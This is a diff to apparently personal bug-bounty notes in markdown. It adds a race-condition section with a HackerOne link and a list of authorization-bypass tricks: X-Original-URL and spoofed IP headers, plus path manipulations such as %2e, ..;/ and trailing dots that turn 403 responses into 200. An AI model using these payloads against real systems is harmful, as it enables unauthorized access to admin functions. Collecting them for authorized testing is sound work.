@@ -13,6 +13,7 @@
 - [Logic Flaw](#logicflaw)
    - [Bypassing Rate Limit](#bypassratelimit)
    - [Account takeover using OTP](#acctakeotp)
+- [Race Condition](#racecondition)
 - [IDOR](#idor)
 - [Web App](#webapp)
    - [SQL Injection](#sqlinj)
@@ -25,6 +26,7 @@
    - [XML External Entity (XXE)](#xxe)
    - [Subdomain Takeover](#subdomain)
    - [Path Traversal Vulnerability](#ptv)
+   
 - [Reverse Engineering](#re)
    - [Methodology](#remeth)
 
@@ -159,12 +161,16 @@ Another way of account takeover is to check every request sent for reset passwor
 
 https://medium.com/bugbountywriteup/simple-logic-leads-to-account-takeover-63fec69e88b7
 
+<a name="racecondition"></a>
+## Race Condition
+
+Example:
+https://hackerone.com/reports/927384
 
 <a name="idor"></a>
 ## IDOR
 
 IDOR mainly means unauthorized access to other users' information.
-
 
 ### Second Order IDOR
 
@@ -189,6 +195,47 @@ Attack scenario:
 4. Forward the success redirection
 
 This occurs because back end only check if the id would return success or fail without further checking.
+
+### Tricks to bypass authorization
+
+```
+GET /admin HTTP/1.1 
+Host: example.com --> 403
+
+GET /whatever HTTP/1.1
+Host: example.com
+X-Original-URL --> 200
+```
+
+```
+example.com/admin -->403
+example.com/%2e/admin -->200
+```
+
+```
+/admin/panel --> 403
+/admin/monitor --> 200
+/admin/monitor/;admin --> 200
+```
+
+'''
+GET /delete?user=1 -->401
+
+GET /delete?user=1 
+X-custome-IP-Authorization:127.0.0.1 --> 200
+'''
+
+```
+example.com/admin --> 403
+example.com/admin/. -->200
+example.com/admin// --> 200
+example.com/./admin/./ --> 200
+```
+
+```
+example.com/admin/ --> 302
+example.com/admin..;/ --> 200
+```
 
 <a name="webapp"></a>
 ## Web App 
